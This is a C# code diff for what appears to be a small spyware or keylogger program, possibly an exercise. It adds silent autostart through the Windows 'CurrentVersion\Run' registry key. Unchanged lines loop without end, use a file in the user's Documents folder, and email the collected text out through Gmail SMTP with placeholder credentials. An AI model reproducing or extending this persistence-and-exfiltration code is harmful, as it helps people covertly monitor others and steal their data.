@@ -1,9 +1,11 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.IO;
 using System.Net;
 using System.Net.Mail;
 using System.Runtime.InteropServices;
 using System.Threading;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace No_4._1
 {
@@ -16,6 +18,18 @@ namespace No_4._1
         static void Main(string[] args)
         {
             String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+            const string applicationName = "testProgram";
+            const string pathRegistryKeyStartup =
+                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+            using (RegistryKey registryKeyStartup =
+                        Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
+            {
+                registryKeyStartup.SetValue(
+                    applicationName,
+                    string.Format("\"{0}\"", System.Reflection.Assembly.GetExecutingAssembly().Location));
+            }
 
             while (true)
             {
@@ -86,12 +100,12 @@ namespace No_4._1
                 SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                 MailMessage mailMessage = new MailMessage();
 
-                mailMessage.From = new MailAddress("/*mail*/");
-                mailMessage.To.Add("/*mail*/");
+                mailMessage.From = new MailAddress("/*email*/");
+                mailMessage.To.Add("/*email*/");
                 mailMessage.Subject = subject;
                 client.UseDefaultCredentials = false;
                 client.EnableSsl = true;
-                client.Credentials = new System.Net.NetworkCredential("/*mail*/", "/*password*/");
+                client.Credentials = new System.Net.NetworkCredential("/*email*/", "/*password*/");
                 mailMessage.Body = emailBody;
                 client.Send(mailMessage);
             }
